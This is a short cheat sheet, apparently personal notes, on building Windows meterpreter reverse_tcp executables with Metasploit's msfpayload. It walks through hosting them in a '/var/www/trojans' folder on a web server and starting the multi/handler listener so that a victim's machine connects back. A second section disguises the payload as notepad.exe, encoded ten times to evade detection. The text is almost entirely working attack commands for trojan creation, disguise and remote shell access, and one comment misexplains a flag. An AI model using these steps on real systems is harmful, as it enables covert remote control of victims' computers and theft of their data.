Metasploit msfpayload
=====================

run in regular shell not in msfconsole

	$ msfpayload windows/meterpreter/reverse_tcp LHOST=[LOCALHOST] X > reverse_tcp.exe
			# X > reverse_tcp.exe; executable is being created

load executable on web server

	open new terminal
	$ apache2ctl restart
	$ mkdir /var/www/trojans
	$ cp reverse_tcp.exe /var/www/trojans

run exploit in msfconsole

	$ use exploit/multi/handler
	$ set PAYLOAD windows/meterpreter/reverse_tcp
	$ set LHOST [LOCALHOST]
	$ exploit

victim needs to visit [LOCALHOST]

#### Encoding existing executable 

	$ msfpayload windows/meterpreter/reverse_tcp LHOST=[LOCALHOST] R | msfencode -t exe -x \
      /root/Desktop/notepad.exe -c 10 -o notepad.exe 
			# -c wll encode 10 times 
			# -o is the output file
			# R |  is /root
	$ cp notepad.exe /var/www/trojans

Use msfconsole to start the payload handler

	msf> use exploit/multi/handler
	msf> set PAYLOAD windows/meterpreter/reverse_tcp
	msf> set LHOST [LOCALHOST]
	msf> exploit





